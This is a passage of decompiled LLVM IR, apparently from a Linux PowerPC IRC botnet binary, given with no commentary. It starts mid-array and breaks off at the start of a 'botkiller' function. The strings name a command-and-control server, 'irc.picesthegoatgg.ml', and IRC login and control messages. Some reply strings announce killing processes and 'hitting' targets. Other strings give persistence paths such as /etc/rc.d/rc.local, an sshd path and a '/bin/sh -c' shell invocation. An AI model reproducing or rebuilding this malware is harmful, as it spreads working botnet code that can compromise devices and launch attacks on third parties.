0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b398.131, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b3a4.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b3ac.133, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b3b4.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b3c0.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b3cc.136, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b3d8.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b3e4.138, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b3ec.139, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b3f4.140, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b400.141, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b40c.142, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b418.143, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b424.144, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b42c.145, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1000b438.146, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b448.147, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b450.148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b458.149, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b464.150, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b470.151, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b47c.152, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b48c.153, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b49c.154, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b4ac.155, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b4bc.156, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b4c8.157, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b4d4.158, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1000b4e4.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b4f4.160, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b504.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b514.162, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1000b520.163, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1000b530.164, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b544.165, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b550.166, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b55c.167, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b56c.168, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b57c.169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000af6c.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b588.170, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b594.171, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b59c.172, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5a4.173, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5ac.174, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5b4.175, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5bc.176, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5c4.177, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5cc.178, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5d4.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5dc.180, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5e4.181, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5ec.182, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5f4.183, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5fc.184, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b604.185, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b60c.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b614.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b61c.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b624.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b62c.190, i32 0, i32 0), i8* bitcast (i32* @global_var_1000b634.191 to i8*), i8* bitcast (i32* @global_var_1000b638.192 to i8*), i8* bitcast (i32* @global_var_1000b63c.193 to i8*), i8* bitcast (i32* @global_var_1000b640.194 to i8*), i8* bitcast (i32* @global_var_1000b644.195 to i8*), i8* bitcast (i32* @global_var_1000b648.196 to i8*), i8* bitcast (i32* @global_var_1000b64c.197 to i8*), i8* bitcast (i32* @global_var_1000b650.198 to i8*), i8* bitcast (i32* @global_var_1000b654.199 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b658.200, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b65c.201, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b660.202, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b664.203, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b668.204, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b66c.205, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b670.206, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b674.207, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b678.208, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b67c.209, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b680.210, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b684.211, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b688.212, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b694.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b69c.214, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b6a4.215, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6ac.216, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6b0.217, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6b4.218, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6b8.219, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6bc.220, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6c0.221, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6c4.222, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6c8.223, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6cc.224, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6d0.225, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6d4.226, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6d8.227, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6dc.228, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6e0.229, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6e4.230, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6e8.231, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6ec.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6f0.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b6f4.234, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b700.235, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b708.236, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b710.237, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b718.238, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b720.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b728.240, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b730.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b738.242, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b740.243, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b74c.244, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b754.245, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b75c.246, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b768.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b770.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b778.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b780.250, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b788.251, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b790.252, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b798.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b7a0.254, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b7ac.255, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b7b4.256, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b868.257, i32 0, i32 0)]
@global_var_1001d8bc.262 = global i32 0
@global_var_1001d828.263 = global i32 0
@global_var_1001d824.265 = local_unnamed_addr global i32 0
@global_var_1001d850.266 = local_unnamed_addr global i32 0
@global_var_1000b7f4.267 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1000b804.268 = constant i32 1912602624
@global_var_1001d82c.269 = local_unnamed_addr global i32 0
@global_var_1000b808.270 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000e4c.271 = constant [3 x i8] c"8`\00"
@global_var_10000ea4.272 = constant [3 x i8] c"8`\00"
@global_var_1000b824.273 = constant [4 x i8] c"std\00"
@global_var_10000fd8.274 = constant [3 x i8] c"8`\00"
@global_var_10001004.275 = constant [3 x i8] c"8`\00"
@global_var_1000100c.276 = constant i32 939524096
@global_var_1001d84c.277 = local_unnamed_addr global i32 0
@global_var_1000b828.278 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_1000b848.279 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_1000127c.280 = constant i32 1207979577
@global_var_1000134c.281 = constant [3 x i8] c"8`\00"
@global_var_1000b7ec.282 = constant [6 x i8] c"pices\00"
@global_var_1000baa8.283 = constant i32 1
@global_var_1001d56c.286 = global i32 34603008
@global_var_1001d7d4.287 = local_unnamed_addr global [9 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b7ec.282, i32 0, i32 0), i8* bitcast (i32* @global_var_1000baa8.283 to i8*), i8* bitcast (i32* @global_var_1000baa8.283 to i8*), i8* bitcast (i16* @global_var_1001d4cc.284 to i8*), i8* bitcast (i16* @global_var_1001d51c.285 to i8*), i8* bitcast (i32* @global_var_1001d56c.286 to i8*), i8* bitcast (i16* @global_var_1001d4cc.284 to i8*), i8* bitcast (i16* @global_var_1001d51c.285 to i8*), i8* bitcast (i16* @global_var_1001d4cc.284 to i8*)]
@global_var_10001534.288 = constant i32 939524096
@global_var_1001d834.289 = local_unnamed_addr global i32 0
@global_var_1000b8ac.290 = constant i32 0
@global_var_1001d43c.291 = global [4 x i8]* @global_var_1000b868.257
@global_var_100018c8.292 = constant i32 939524097
@global_var_1000b8b0.293 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_1001d848.294 = local_unnamed_addr global i32 0
@global_var_1000b8c0.295 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1000b8d0.296 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1000b8d8.297 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1001d820.298 = local_unnamed_addr global i32 0
@global_var_1000b8e4.303 = constant [17 x i8] c"[linux][powerpc]\00"
@global_var_1001d838.304 = local_unnamed_addr global i32 0
@global_var_1001d814.305 = local_unnamed_addr global i32 0
@global_var_1001d7c8.306 = local_unnamed_addr global i32 1
@global_var_1000b7d4.307 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_1001d7cc.308 = global [22 x i8]* @global_var_1000b7d4.307
@global_var_1001d840.309 = local_unnamed_addr global i32 0
@global_var_10001f90.310 = constant i32 1207959580
@global_var_10001fe8.311 = constant [3 x i8] c"8`\00"
@global_var_100020a8.312 = constant i32 1207959668
@global_var_100020dc.313 = constant [3 x i8] c"8`\00"
@global_var_1000b918.314 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1000b92c.315 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1000b93c.316 = constant i32 788529152
@global_var_1000b940.317 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_10002274.318 = constant i32 1207959620
@global_var_1000b948.319 = constant i32 1627389952
@global_var_1000231c.320 = constant i32 1207959576
@global_var_10002328.321 = constant i32 1207959564
@global_var_10002334.322 = constant i32 1207961793
@global_var_1000b94c.323 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_1000237c.324 = constant i32 939524097
@global_var_1001d83c.325 = local_unnamed_addr global i32 0
@global_var_1000b95c.326 = constant i32 587202560
@global_var_1000b960.327 = constant i32 0
@global_var_1001d830.328 = local_unnamed_addr global i32 0
@global_var_1000b964.329 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_1000b970.330 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10002530.331 = constant i32 1207959556
@global_var_1000b99c.332 = constant i32 167772160
@global_var_10002918.333 = constant i32 1207959568
@global_var_100029c0.334 = constant i32 939524096
@global_var_1000b8f8.335 = constant [4 x i8] c"352\00"
@global_var_1001d464.336 = global [4 x i8]* @global_var_1000b8f8.335
@global_var_1000b9a0.337 = constant [6 x i8] c"ERROR\00"
@global_var_10002b44.338 = constant i32 1207959564
@global_var_10002d1c.339 = constant i32 1207959560
@global_var_1001d86c.340 = local_unnamed_addr global i32 0
@global_var_1001d87c.341 = global i32 0
@global_var_10006d28.342 = constant [3 x i8] c"8`\00"
@global_var_1001d4b4.343 = global i32 0
@global_var_1001d854.344 = local_unnamed_addr global i32 0
@global_var_1001d858.345 = local_unnamed_addr global i32 0
@global_var_1000306c.346 = constant i32 1207965645
@global_var_10003264.347 = constant i32 1207960120
@global_var_1001d7f8.348 = local_unnamed_addr global i32 2
@global_var_1001d49c.349 = global i32 0
@global_var_1001d7f4.350 = global i32* bitcast (i16* @global_var_1001d4cc.284 to i32*)
@global_var_10003498.351 = constant i32 1207959560
@global_var_100034e8.352 = constant [3 x i8] c" c\00"
@global_var_10003504.353 = constant [3 x i8] c" c\00"
@global_var_1000bca8.354 = constant i32 0
@global_var_100037a0.355 = constant i32 1207961092
@global_var_100038cc.356 = constant i32 1207960768
@global_var_1000bcdc.357 = constant i32 269488136
@global_var_1000bcc0.358 = constant [6 x i8] c"(nil)\00"
@global_var_1000bcc8.359 = constant [7 x i8] c"(null)\00"
@global_var_1000bcd0.360 = constant i32 721431808
@global_var_10003d28.361 = constant i32 939524096
@global_var_1000bd5c.362 = constant i32 65793
@global_var_1000bd44.363 = constant i32 524293
@global_var_1001d808 = external local_unnamed_addr global i32
@global_var_1000cd16.365 = constant i32 1
@global_var_1000bd3c.366 = constant [8 x i8] c" +0-#'I\00"
@global_var_1000bce4.367 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1000bd24.368 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1000bd18.369 = constant i32 67343
@global_var_1000bd17.370 = constant i32 50331911
@global_var_1000bd08.371 = constant i32 268435461
@global_var_1000bcf8.372 = constant i32 520093701
@global_var_100046e4.373 = constant [3 x i8] c"8a\00"
@global_var_10004a0c.374 = constant i32 1207959708
@global_var_10004ab4.375 = constant i32 1207959612
@global_var_10004c00.376 = constant i32 939589631
@global_var_10004cb4.377 = constant i32 939524118
@global_var_1000bd78.378 = constant [8 x i8] c"Success\00"
@global_var_1000bd68.379 = constant [15 x i8] c"Unknown error \00"
@global_var_1001d810.380 = local_unnamed_addr global i32* @global_var_1000cd16.365
@global_var_1001d85c.381 = global i32 0
@global_var_1001fe88.382 = global i32 0
@global_var_1001fcbc.383 = global i32 0
@global_var_1001d798.384 = global i32 0
@global_var_1001d888.385 = local_unnamed_addr global i32 0
@global_var_1001fef4.386 = global i32 0
@global_var_10005748.387 = constant [3 x i8] c"8`\00"
@global_var_1000582c.388 = constant i32 939524098
@global_var_1000586c.389 = constant [3 x i8] c"8`\00"
@global_var_1001fe9c.390 = global i32 0
@global_var_1001d7fc = external global i32
@global_var_1001fecc.393 = global i32 0
@global_var_10005bb0.394 = constant i32 939524108
@global_var_10005c48.395 = constant [3 x i8] c"8`\00"
@global_var_10005cf4.396 = constant [3 x i8] c"8`\00"
@global_var_1000601c.397 = constant i32 1207959640
@global_var_10006058.398 = constant i32 1207959580
@global_var_1001d6c8.399 = global i32 0
@global_var_1001d6e0 = external global i32
@global_var_1001d700.401 = global i32 -1726662223
@global_var_1001d6e8.402 = local_unnamed_addr global i32* @global_var_1001d700.401
@global_var_1001d6e4.403 = global i32* @global_var_1001d700.401
@global_var_1000c8d4.404 = constant i32 0
@global_var_10006370.405 = constant i32 939524118
@global_var_1000c8fc.406 = constant [8 x i8] c"/bin/sh\00"
@global_var_1000c904.407 = constant [3 x i8] c"sh\00"
@global_var_1000c908.408 = constant [3 x i8] c"-c\00"
@global_var_100066c4.409 = constant [3 x i8] c"8`\00"
@global_var_100068d8.410 = constant i32 939524130
@global_var_1001d77c.411 = global i32 0
@global_var_1001d860.412 = local_unnamed_addr global i32 0
@global_var_1000696c.413 = constant i32 1207960361
@global_var_1001d868.414 = local_unnamed_addr global i32 0
@global_var_1001d044.415 = global i32 -1
@global_var_1001d870.416 = local_unnamed_addr global i32 0
@global_var_1001d874.417 = local_unnamed_addr global i32 0
@global_var_1000c90c.418 = constant [10 x i8] c"/dev/null\00"
@global_var_1001d878.419 = local_unnamed_addr global i32 0
@global_var_1001d864.420 = local_unnamed_addr global i32 0
@global_var_10007040.421 = constant i32 939524096
@global_var_1000705c.422 = constant i32 939524096
@global_var_10007080.423 = constant i32 939524285
@global_var_1001d89c.424 = local_unnamed_addr global i32 0
@global_var_100074d8.425 = constant i32 939524118
@global_var_1001d880.426 = global i32 0
@global_var_10007618.427 = constant i32 939524180
@global_var_10007934.428 = constant i32 939524105
@global_var_1000cf40.429 = constant [4 x i8] c"inf\00"
@global_var_1000cf43.431 = constant i32 4804166
@global_var_1000cf50.432 = constant i32 771763200
@global_var_1001feb4.434 = global i32 0
@global_var_1001d884.435 = local_unnamed_addr global i32 0
@global_var_100088e8.437 = constant i32 1207960848
@global_var_1001d88c.438 = local_unnamed_addr global i32 0
@global_var_1000cfa0.439 = constant i32 771751936
@global_var_1001fee4.440 = global i32 0
@global_var_100089d8.441 = constant [3 x i8] c"8a\00"
@global_var_100089e4.442 = constant i32 939524097
@global_var_10008ab8.443 = constant i32 939524097
@global_var_10008b8c.444 = constant i32 939524097
@global_var_10008bb8.445 = constant i32 939524100
@global_var_10008c98.446 = constant i32 1207959684
@global_var_10008e14.447 = constant i32 939589631
@global_var_1000cfbc.448 = constant i32 1912602624
@global_var_1000cfa8.449 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1000cfc0.450 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1000cfd8.451 = constant [11 x i8] c"nameserver\00"
@global_var_1000cfe4.452 = constant [7 x i8] c"domain\00"
@global_var_1000cfec.453 = constant [7 x i8] c"search\00"
@global_var_1000914c.454 = constant i32 1207959568
@global_var_10009154.455 = constant i32 939524099
@global_var_100092c8.456 = constant i32 939524118
@global_var_1001ff00.457 = global i32 0
@global_var_1001d7b0.458 = global i32 0
@global_var_1000940c.459 = constant i32 939524129
@global_var_1001d890.460 = local_unnamed_addr global i32 0
@global_var_10009480.461 = constant [3 x i8] c"8`\00"
@global_var_100094b8.462 = constant i32 939524129
@global_var_1001d894.463 = local_unnamed_addr global i32 0
@global_var_1001d898.464 = local_unnamed_addr global i32 0
@global_var_100098c8.465 = constant i32 939524171
@global_var_10009978.466 = constant i32 939524105
@global_var_10009d14.467 = constant [3 x i8] c"8`\00"
@global_var_1000d008.468 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_10009f0c.469 = constant [3 x i8] c"9 \00"
@global_var_10009f18.470 = constant i32 939524193
@global_var_10009f80.472 = constant i32 939524101
@global_var_1000a06c.473 = constant i32 939524124
@global_var_1000a0e4.474 = constant i32 1207960116
@global_var_1000a0fc.475 = constant i32 939524105
@global_var_1000a274.476 = constant [3 x i8] c"9 \00"
@global_var_1000d01c.477 = constant [3 x i8] c"%x\00"
@global_var_1000a300.478 = constant i32 939524124
@global_var_1000a324.479 = constant i32 939524193
@global_var_1000d020.480 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1000d02c.481 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000aa10.482 = constant i32 1207959560
@global_var_1000aaa8.483 = constant i32 939589631
@global_var_1001d048.484 = global i32 0
@global_var_1001d8a0.2 = local_unnamed_addr global i8 0
@global_var_1001d818.264 = local_unnamed_addr global i8 0
@global_var_1001d4cc.284 = global i16 288
@global_var_1001d51c.285 = global i16 272
@global_var_1001d81c.299 = external local_unnamed_addr global i8*
@global_var_1001d81f.300 = external local_unnamed_addr global i8*
@global_var_1001d81e.301 = external local_unnamed_addr global i8*
@global_var_1001d81d.302 = external global i8*
@global_var_1001d794.436 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1001d8a0.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001d05c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001d05c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001d05c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1001d8a0.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1001d8a0.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1001d054.8, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1001d054.8 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268443956, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268480188, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @botkiller(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000238 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000238, i32* %stack_var_-112, align 4
  %v5_10000238 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v5_10000238, i32* @r31, align 4
  %v2_10000258 = ptrtoint i8** %stack_var_-100 to i32
  %v2_100002a0 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_1000024c

